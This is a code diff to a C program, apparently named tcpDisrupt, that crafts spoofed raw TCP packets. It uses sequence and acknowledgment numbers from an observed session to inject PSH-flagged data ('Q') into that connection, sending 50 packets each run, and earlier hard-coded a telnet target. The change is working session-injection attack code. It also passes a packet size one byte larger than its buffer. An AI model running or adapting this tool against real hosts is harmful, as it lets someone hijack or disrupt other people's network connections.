@@ -42,8 +42,7 @@ int main(int argc, char **argv) {
                 break;
         }
     }
-
-/* For now, these will not need to be mandatory: 
+    
     if(clientIP == NULL) {
         fprintf(stderr, "Client IP address was not provided.\n");
         display_usage(argv[0]);
@@ -55,11 +54,6 @@ int main(int argc, char **argv) {
         display_usage(argv[0]);
         return EXIT_FAILURE;
     }
-    // TODO: Remove this
-    if(interface != NULL) {
-        printf("Interface %s\n", interface);
-    }
-*/
 
     int result = tcpDisrupt(clientIP, serverIP, serverPort, interface);
     if (result){
@@ -102,7 +96,8 @@ void display_usage(char *name) {
  * @param ackNumber         The last sequence number acknowledged by the source.
  */
 void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, uint16_t destinationPort, uint32_t sequenceNumber, uint32_t ackNumber, int timestamp, int finalRound) {
-    static char packet[ sizeof(struct tcphdr) + sizeof(struct iphdr) + 2 ];
+// void disrupt_session(const u_char *sniffed_packet) {
+    static char packet[ sizeof(struct tcphdr) + sizeof(struct iphdr) + 5 ];
     
     // Socket FD
     int sock, one = 1;
@@ -134,31 +129,32 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
 
     //Populate address struct
     addr_in.sin_family = AF_INET;
-    addr_in.sin_port = htons(23);
-    addr_in.sin_addr.s_addr = inet_addr("192.168.1.112");
+    addr_in.sin_port = htons(sourcePort);
+    addr_in.sin_addr.s_addr = inet_addr(sourceIP);
 
 struct tcphdr *tcpHdr = (struct tcphdr*) (packet + sizeof(struct iphdr));
 
 printf("dest ip: %s\n", sourceIP);
 printf("dest prt: %d\n", sourcePort);
+printf("waiting to spam packets ...\n");
 getchar();
 
 int z = 50;
-while(z--){
-    fill_packet("127.0.0.1",                                                  //srcIP
-                "192.168.1.112",                                              //dstIP
-                23,                                                           //dstPort
-                1337,                                                         //srcPort
-                SYN_ON,                                                       //syn
-                ACK_ON,                                                       //ack
-                0,                                                            //seq
-                0,                                                            //ack_seq
+while(z--) {
+    fill_packet(destinationIP,                                                //srcIP
+                sourceIP,                                                     //dstIP
+                sourcePort,                                                   //dstPort
+                destinationPort,                                              //srcPort
+                SYN_OFF,                                                      //syn
+                ACK_OFF,                                                      //ack
+                ackNumber,                                                    //seq
+                sequenceNumber,                                               //ack_seq
                 RESET_OFF,                                                    //rst
-                "",                                                           //data
+                "Q",                                                          //data
                 packet,                                                       //packet
-                sizeof(struct tcphdr) + sizeof(struct iphdr) + 2);            //packet_size
+                sizeof(struct tcphdr) + sizeof(struct iphdr) + 6);            //packet_size
 
-    tcpHdr->psh = 0;
+    tcpHdr->psh = 1;
     // Send out the packet
     send_packet(sock, packet, addr_in);
 
